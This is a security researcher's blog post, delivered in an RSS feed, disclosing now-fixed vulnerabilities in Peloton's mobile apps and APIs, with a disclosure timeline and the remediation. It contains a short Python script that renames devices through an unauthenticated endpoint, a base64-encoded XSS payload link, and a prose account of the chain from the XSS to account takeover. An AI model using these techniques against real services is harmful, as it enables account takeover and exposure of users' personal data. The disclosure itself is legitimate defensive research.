<p>As mentioned above, stay up with the latest mobile DevSecOps trends with our newsletter — <a href="https://info.nowsecure.com/newsletter-subscribe.html">subscribe</a> to receive it in your inbox on the first and third Wednesday of each month. Developers and security analysts alike can upskill and expand their knowledge of mobile appsec via <a href="https://www.nowsecure.com/products/nowsecure-academy-mobile-appsec-training/">NowSecure Academy free training</a>. And finally, it’s our hope that following the above tips can help you build secure mobile apps faster.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2021/12/22/30-secure-mobile-app-development-tricks-to-try-in-2022/">30+ Secure Mobile App Development Tricks to Try In 2022</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
    <item>
      <title>It’s Not About the Bike: Vulnerabilities in Peloton’s Mobile Apps and APIs</title>
      <link>https://www.nowsecure.com/blog/2021/12/08/its-not-about-the-bike-how-nowsecure-helped-peloton-secure-its-mobile-apps-apis/</link>
      <dc:creator><![CDATA[Matthew F]]></dc:creator>
      <pubDate>Wed, 08 Dec 2021 16:00:00 +0000</pubDate>
      <category><![CDATA[Company News]]></category>
      <category><![CDATA[Research & Threat Intel]]></category>
      <guid isPermaLink="false">https://www.nowsecure.com/?p=15931</guid>
      <description><![CDATA[<p>Peloton has become perhaps the most well known and successful fitness equipment company today. It makes several connected fitness products including popular Internet-connected stationary exercise bikes and publishes an impressive library of live and on-demand course content. The class platform offers an immersive experience that makes exercise fun and competitive. But this blog post isn’t</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2021/12/08/its-not-about-the-bike-how-nowsecure-helped-peloton-secure-its-mobile-apps-apis/">It&#8217;s Not About the Bike: Vulnerabilities in Peloton’s Mobile Apps and APIs</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></description>
      <content:encoded><![CDATA[
<p>Peloton has become perhaps the most well known and successful fitness equipment company today. It makes several connected fitness products including popular Internet-connected stationary exercise bikes and publishes an impressive library of live and on-demand course content. The class platform offers an immersive experience that makes exercise fun and competitive.</p>



<p>But this blog post isn’t about exercise because I’m not good at that. This post explores my discovery of security vulnerabilities in Peloton mobile apps and the company’s web APIs, something I’m much better at as a mobile security researcher for NowSecure.</p>



<p>This blog post covers <strong>Peloton security</strong>, the vulnerabilities that have been communicated to the vendor in accordance with its <a href="https://support.onepeloton.com/hc/en-us/articles/360024551291">Responsible Disclosure program</a> and the remediation that Peloton has completed and deployed to its customers and equipment around the world. Peloton has been excellent to work with on these issues, responding promptly and constructively to the disclosed vulnerabilities. Every vulnerability listed in this post has been confirmed to be fixed and Peloton has stated that users don’t need to take any action because their systems have already been updated.</p>



<h2>Disclosure Summary</h2>



<p>The following security and privacy issues can be found in this disclosure:</p>



<ol><li>Peloton user exposure to account takeover&nbsp;</li><li>Peloton user exposure to phishing attack</li><li>Remote access to Peloton users’ private personal information&nbsp;</li><li>Ability to remotely change device name and serial number</li></ol>



<p>Sadly we frequently find issues like this across thousands of mobile apps in our mobile security research and mobile app pen testing. With <a href="https://www.nowsecure.com/mobile-app-breach-news/">mobile breaches</a> rising year after year our team even built a <a href="http://mobilerisktracker.nowsecure.com">mobile risk tracker</a> to help people understand. While these Peloton security and privacy vulnerabilities described in this post are serious issues that should concern any user, the good news is they have been resolved.</p>



<h2>Peloton Security Collaboration</h2>



<p>Peloton collaborated with NowSecure on these issues in a professional manner with swift responses and fixes and the team requested information when necessary. Security researchers who want to learn more about the Peloton Coordinated Vulnerability Disclosure (CVD) program can visit <a href="https://support.onepeloton.com/hc/en-us/articles/360024551291">here</a>. Media inquiries can contact <a href="mailto:press@onepeloton.com">press@onepeloton.com</a>.</p>



<p>&#8220;Collaborations with security researchers and analysts play a key role in how we keep the Peloton community secure,&#8221; says Jorge Lopez, director of global security incident response &amp; threat intelligence for Peloton. &#8220;We’d like to thank Austin Emmitt and the NowSecure team for their partnership and for working hand-in-hand with us from the minute they reported the vulnerabilities. Together we were able to quickly address the issues they identified and validate the fixes. Our investigation revealed no evidence that sensitive information was exposed and Peloton Members do not need to take any action as a result of this disclosure.&#8221;</p>



<p>While I&#8217;m a full-time security researcher, my company NowSecure has for more than a decade worked with mobile developers and security teams around the world, providing <a href="https://www.nowsecure.com/products/nowsecure-platform/">automated security testing tools</a>, <a href="https://www.nowsecure.com/products/nowsecure-workstation/">pen tester tools</a>,&nbsp; <a href="https://academy.nowsecure.com/">training</a> and <a href="https://www.nowsecure.com/products/nowsecure-mobile-app-penetration-testing-services/">pen testing services</a> to help them grow their mobile security programs. Also, my fellow researchers here at NowSecure have created the popular open-source security tools, <a href="https://frida.re/">Frida</a> and <a href="https://rada.re/n/">Radare</a>.</p>



<p>What follows are the technical details of my security research activities with Peloton, the vulnerabilities found, the quality interaction and fast resolutions.</p>



<h2>Disclosure Timeline</h2>



<ul><li>9/22/21 &#8211; Initial Disclosure to Peloton containing<ul><li>Web API Security Vulnerabilities<ul><li>Reflected XSS in the <code>redirectUrl</code> parameter in<a href="https://members.onepeloton.com/callback/?redirectUrl=amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUpCg=="> https://members.onepeloton.com/callback/?redirectUrl=</a>… . This could result in full account takeover if an attacker can get a victim to click a malicious link. <strong>CVSS 8.8 &#8211; High</strong>.</li><li>IDOR / Information Disclosure in the endpoint<a href="https://api.onepeloton.com/api/device/8fcdb9eefa594b96b256587111f4a220?joins=subscription,subscription.user"> https://api.onepeloton.com/api/device/&lt;device id&gt;?joins=subscription,subscription.user</a>. This endpoint allowed an unauthenticated attacker to obtain sensitive information about any user and the user’s subscription if the attacker knows the victim’s device_id. Additionally unauthenticated requests could change the device name and serial number. <strong>CVSS 8.8 &#8211; High</strong>.</li></ul></li><li>iOS App Issues<ul><li>Disabled iOS native App Transport Security (ATS) Protection Can Lead to Insecure Network Connections. <strong>CVSS 6.1 &#8211; Medium</strong>.</li><li>Allowing Third-Party Keyboards Potentially Exposes User Input. <strong>CVSS 5.5 &#8211; Medium</strong>.</li></ul></li></ul></li><li>9/27/21 &#8211; Response email from Peloton Product Security asking for more details on specific issues.</li><li>9/29/21 &#8211; Email from Peloton Product Security confirming the XSS and Information Disclosure issues, additionally agreeing with my scoring of these issues to be <strong>CVSS 8.8</strong>.</li></ul>



<ul><li>10/20/21 &#8211; Email from Peloton Product Security announcing a fix rolling out for the XSS and iOS app issues. The information disclosure was not yet fixed.</li><li>10/26/21 &#8211; We confirmed that the XSS issue had been resolved and communicated this to Peloton.</li><li>11/5/21 &#8211; We emailed the Peloton Product Security team about changes they have made to the device endpoint to fix the remaining information disclosure issue. We also confirmed with them that the iOS app issues have been fixed as well.</li><li>12/8/21 &#8211; Public disclosure of our findings.</li></ul>



<p></p>



<blockquote class="custom-quote bg-blue color-default">

    <i class="fas fa-quote-left"></i>
	We’d like to thank Austin Emmitt and the NowSecure team for their partnership and for working hand in hand with us from the minute they reported the vulnerabilities.    <i class="fas fa-quote-right"></i>

	
        <cite>&#8211; Jorge Lopez, Director, Global Security Incident Response &#038; Threat Intelligence, Peloton </cite>

	
</blockquote>



<h2>The Peloton Platforms</h2>



<p>Users can access Peloton class content from a number of platforms, including the web, Android and iPhone mobile apps, and the apps running on the tablets mounted to Peloton bikes and treadmills. On the web users can access classes and account information at<a href="http://members.onepeloton.com/"> members.onepeloton.com</a>. This site, the apps and the tablets built into the equipment all communicate with the API at<a href="http://api.onepeloton.com/"> api.onepeloton.com</a>. For instance, information about a specific class session can be found at <a href="https://api.onepeloton.com/api/peloton/f6888dccf5554a2f92cfc376eda1721c">https://api.onepeloton.com/api/peloton/f6888dccf5554a2f92cfc376eda1721c</a>. It’s not surprising that the apps on Android and on the bike itself share the same backend APIs because the bike tablet also runs Android and shares much of the same client-side code as the mobile app in the Google Play Store. At the time of publication, the lower cost Bike model (as opposed to the Bike+) runs Android 7.0.</p>



<h2>The Peloton Bike Tablet</h2>



<p>Though it is not immediately obvious, the tablet attached to the Bike runs Android. This is quickly verified by tapping ‘Settings’ in the upper right hand corner after the device has started and the profile login screen is shown. By going to the ‘About’ section we can find the build information, and by tapping the ‘Build’ number 7 times we can access the developer options and enable Android Debug Bridge (adb), a command-line tool for interacting with Android devices. Any app can be installed with <code>adb install</code> including a new launcher, like the standard Pixel Launcher.</p>



<p>The hardware on the bike is also a pretty standard Mediatek SoC, the<a href="https://www.mediatek.com/products/tablets/mt8173"> mt8173</a>. This can be seen in this snippet of output from <code>getprop</code></p>



<p><code>[ro.mediatek.chip_ver]: [S01]</code><br><code>[</code><span class="has-inline-color has-black-color"><code>ro.mediatek.platform]: [MT8173]</code><br><code>[ro.mediatek.project.path]: [device/peloton/qbert]</code><br><code>[ro.mediatek.version.branch]: [alps-mp-n0.mp12]</code><br><code>[ro.mediatek.version.release]: [alps-mp-n0.mp12-V1.32_qt8173.tb.ui7.n_P25]</code><br><code>[ro.mediatek.version.sdk]: [4]</code></span></p>



<p>Additionally <code>adb</code> access allows us to retrieve the output of <code>logcat</code>, which among other things gives us a glimpse into the bike’s communications with the backend:</p>



<p><code>11-24 22:18:15.743 16605 21812 I okhttp.OkHttpClient: --&gt; GET https://api.onepeloton.com/api/me</code><br><code>11-24 22:18:15.916 16605 21808 I okhttp.OkHttpClient: &lt;-- 200 https://gql-graphql-gateway.prod.k8s.onepeloton.com/graphql (383ms, unknown-length body)</code><br><code>11-24 22:18:16.345 16605 21812 I okhttp.OkHttpClient: &lt;-- 200 https://api.onepeloton.com/api/me (601ms, unknown-length body)</code><br><code>11-24 22:18:16.373 16605 21808 I okhttp.OkHttpClient: --&gt; GET https://api.onepeloton.com/api/schedule/events?start=1637730000&amp;end=1638939600&amp;apply_platform_filter=false</code><br><code>11-24 22:18:16.387 16605 21819 I okhttp.OkHttpClient: --&gt; GET https://api.onepeloton.com/api/schedule/events?start=1637730000&amp;end=1638939600&amp;apply_platform_filter=false</code><br><code>11-24 22:18:16.425 16605 21820 I okhttp.OkHttpClient: --&gt; POST https://api.onepeloton.com/stats/token (0-byte body)</code><br><code>11-24 22:18:16.453 16605 21783 I okhttp.OkHttpClient: --&gt; GET https://api.onepeloton.com/api/user/e262e252fb3643fb8c65e0b8ea049bb/contract_agreements</code><br><code>11-24 22:18:16.488 16605 21791 I okhttp.OkHttpClient: --&gt; GET https://api.onepeloton.com/api/user/e262e252fb3643fb8c65e0b8ea0469bb/feed?limit=200</code><br><code>11-24 22:18:16.525 16605 21824 I okhttp.OkHttpClient: --&gt; POST https://api.onepeloton.com/api/started_client_session (0-byte body)</code><br><code>11-24 22:18:16.541 16605 21823 I okhttp.OkHttpClient: --&gt; POST https://gql-graphql-gateway.prod.k8s.onepeloton.com/graphql (1338-byte body)</code><br><code>11-24 22:18:16.556 16605 21814 I okhttp.OkHttpClient: --&gt; PUT https://api.onepeloton.com/api/subscription/&lt;my censored subscription id&gt;/serial (70-byte body)</code><br><code>11-24 22:18:16.643 16605 21823 I okhttp.OkHttpClient: &lt;-- HTTP FAILED: java.io.IOException: Canceled</code><br><code>1311-24 22:18:16.752 16605 21808 I okhttp.OkHttpClient: &lt;-- 200 https://api.onepeloton.com/api/schedule/events?start=1637730000&amp;end=1638939600&amp;apply_platform_filter=false (378ms, 11-byte body)</code></p>



<p>These log outputs allowed us to discover some very important endpoints including:</p>



<ul><li><code>https://api.onepeloton.com/api/me</code> &#8211; information about the current logged in user.</li><li><code>https://api.onepeloton.com/api/user/e262e252fb3643fb8c65e0b8ea0469bb</code> &#8211; information about any user by id (or by username, you can use it instead of the id here).</li><li><code>https://api.onepeloton.com/api/subscription/&lt;my censored subscription id&gt;</code> &#8211; information about the subscription, requires authentication.</li></ul>



<p>The log output also can contain reference to the endpoint with the information disclosure vulnerability described above.</p>



<h2>Information Disclosure from api.onepeloton.com</h2>



<p>During the process of logging into a Peloton account on the Bike, the <code>com.peloton.activity</code> app first checks that the Peloton Bike from which a user logs in is the one already associated with that user’s subscription. It does this by requesting the endpoint <code>https://api.onepeloton.com/api/device/&lt;device id&gt;</code>. This endpoint gives information about Peloton devices, including the name, serial, subscription id etc (at least it used to, it no longer returns such info as part of the fix). It was also possible to pass the <code>joins</code> parameter to the endpoint to include information for the subscription tied to the bike with <code>https://api.onepeloton.com/api/device/&lt;device id&gt;?joins=subscription%2Csubscription.user</code>. This included the cost of the OnePeloton subscription, the date of last payment, and other potentially sensitive information. Additionally the name and serial number of the device could be changed with a <code>PUT</code> request to <code>https://api.onepeloton.com/api/device/&lt;device id&gt;/name</code> (and <code>/tablet_serial_number</code> respectively). Here’s the problem: <strong>no authentication whatsoever was needed for any of the above requests</strong>. As noted above, this endpoint is accessed in the login flow on the device. Specifically, it is accessed <em>before</em> the user has logged in, so it could not be part of the normal user session authenticated communication. This meant it was possible to get sensitive information about any user, their subscription, as well as change the name of their&nbsp;Peloton Bike, without needing anything other than their device id.&nbsp; A script like this one could change any device name to anything you would like.</p>



<p><code><span class="has-inline-color has-vivid-cyan-blue-color">import</span> requests</code><br><code>device_id = <span class="has-inline-color has-vivid-green-cyan-color">"&lt;a valid device id&gt;"</span></code><br><code>endpoint = <span class="has-inline-color has-vivid-green-cyan-color">"https://api.onepeloton.com/api/device/"</span> + device_id + <span class="has-inline-color has-vivid-green-cyan-color">"/name"</span></code><br><code>response = requests.put(endpoint, data='{"name":"&lt;put anything here&gt;"}')</code><br><code><span class="has-inline-color has-vivid-cyan-blue-color">print</span>(response.text)</code></p>



<p>To be clear the device ID is not a value that it is possible to guess, and it is also not leaked in any unauthorized endpoint that I could find. However it was presented in the About screen of the main Peloton app,&nbsp; so any attacker with brief physical access to the Bike could obtain indefinite access to information about a user’s device and subscription. This vulnerability could be made worse if there were a way to discover the device ID or get the user information through XSS.</p>



<h2>XSS on members.onepeloton.com</h2>



<p>As part of the login process on<a href="http://members.onepelton.com/"> members.onepeloton.com</a> a successful login forwarded the user to<a href="https://members.onepeloton.com/callback/?redirectUrl=amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUpCg=="> https://members.onepeloton.com/callback/?redirectUrl=</a>… , which in turn redirected them to the URL found (base64 encoded) in the redirectUrl parameter. This led to both an open redirect vulnerability, and more importantly a reflected XSS vulnerability. By using the javascript:&#8230; URI scheme an attacker could create a malicious link that when clicked would run the attackers JS in the context of<a href="http://members.onepeloton.com/"> members.onepeloton.com</a>.</p>



<figure class="wp-block-image size-large"><img src="https://www.nowsecure.com/wp-content/uploads/2021/12/PelotonXSSVulnerability.png" alt="Peloton Security vulnerability" class="wp-image-15942"/><figcaption>The reflected xss vulnerability with the payload javascript:alert(document.cookie)</figcaption></figure>



<p>The base64 encoding here is a real gift to the attacker as it prevents the suspicious payload from being blocked by cloudflare. This XSS could be leveraged to obtain full account takeover by retrieving the <code>session_id</code> from <code>https://api.onepeloton.com/auth/check_session</code> which also helpfully returns user information, including name, email and phone number if one was provided. The cross-origin settings of<a href="http://api.onepeloton.com/"> api.onepeloton.com</a> permit this request, the response to which could be sent on to a server controlled by the attacker. Setting the cookie <code>peloton_session_id</code> to the discovered <code>session_id</code> value from this endpoint effectively logs the attacker in as the victim. The attacker could then make a <code>PUT</code> request to the<code> /api/user/&lt;user id&gt;</code> endpoint to change the email address associated with the account. Finally by using the “forgot password” feature the attacker could reset the password, taking full control of the account and locking out the original user.</p>



<h2>Peloton iOS Mobile App Issues</h2>



<p>Using the <a href="https://www.nowsecure.com/products/nowsecure-platform/">NowSecure Platform</a> automated mobile application security testing software we were able to discover a number of issues with the Peloton iOS app. One of the simpler and more serious vulnerabilities was the disabling of the iOS native security feature<a href="https://developer.apple.com/documentation/security/preventing_insecure_network_connections"> App Transport Security</a> (ATS). This feature ensures that all connections are made over TLS, preventing <code>http://...</code> connections that could leak sensitive information and be subject to interception and manipulation.</p>



<p>Additionally the Peloton iOS mobile app allowed third-party keyboards which could allow malicious installed keyboards to intercept sensitive information entered into the app by the user. In order to prevent the use of third-party keyboards, developers should include</p>



<p><code><span class="has-inline-color has-vivid-cyan-blue-color">func</span> application(application: <span style="color:#6554c0" class="has-inline-color">UIApplication</span>,</code><br><code>shouldAllowExtensionPointIdentifier extensionPointIdentifier: <span style="color:#6554c0" class="has-inline-color">String</span>) -&gt; <span style="color:#6554c0" class="has-inline-color">Bool</span> {</code><br>   <code><span class="has-inline-color has-vivid-cyan-blue-color">return</span> extensionPointIdentifier != <span style="color:#6554c0" class="has-inline-color">UIApplicationKeyboardExtensionPointIdentifier</span></code><br><code>}</code></p>



<p>These issues represent simple but important ways that mobile app developers can apply <a href="https://www.nowsecure.com/products/nowsecure-academy-mobile-appsec-training/">secure coding best practices</a> to improve the overall security and privacy of their mobile applications.</p>



<p></p>



    <div id="featured-resource-block"
         class="cta-id-15892 resource-id-15050 post-type-resource_item">

                    <div class="image-holder" style="background-image: url(https://www.nowsecure.com/wp-content/uploads/2021/08/hexagon-mobile-phone-laptop.png)"></div>
            <!-- /.image-holder -->

        
        <div class="content-holder">

            <div class="transparent-shape"></div>
            <!-- /.transparent-shape -->
            <div class="grey-shape"></div>
            <!-- /.grey-shape -->

            <div class="content-in">

                                    <h3 class="resource-title">
                        Free Mobile App Security Assessment                    </h3>
                    <!-- /.resource-title -->

                
                
                                    <a href="https://info.nowsecure.com/free-mobile-app-security-report.html"
                       target="_blank">

                        Get Your Free Mobile App Assessment Now!
                    </a>
                    <!-- /.resource-link -->

                
            </div>
            <!-- /.content-in -->

        </div>
        <!-- /.content-holder -->

    </div>
    <!-- /#featured-resource-block -->



<p></p>



<h2>The Fixes</h2>



<p>As stated, Peloton quickly remediated each of the issues described above. The XSS vulnerability was completely removed by simply getting rid of the callback endpoint.</p>



<p>The information disclosure in the device endpoint was more complicated to mitigate. As explained above, this endpoint is an important part of the login process on the Peloton Bike which meant that it was not possible to put the endpoint behind proper authentication. However much of the sensitive information has been removed and the endpoint now also requires the <code>device_serial</code> parameter to be passed so two identifiers would need to be known to the attacker. Additionally the <code>/tablet_serial_number</code> endpoint has been deprecated and the <code>/name</code> endpoint requires authentication with the user that is the “owner” of the subscription associated with the device.</p>



<p>Both iOS app vulnerabilities listed here were fixed in a recent update to the app found in the Apple App Store.</p>
<p>The post <a rel="nofollow" href="https://www.nowsecure.com/blog/2021/12/08/its-not-about-the-bike-how-nowsecure-helped-peloton-secure-its-mobile-apps-apis/">It&#8217;s Not About the Bike: Vulnerabilities in Peloton’s Mobile Apps and APIs</a> appeared first on <a rel="nofollow" href="https://www.nowsecure.com">NowSecure</a>.</p>
]]></content:encoded>
    </item>
  </channel>
</rss>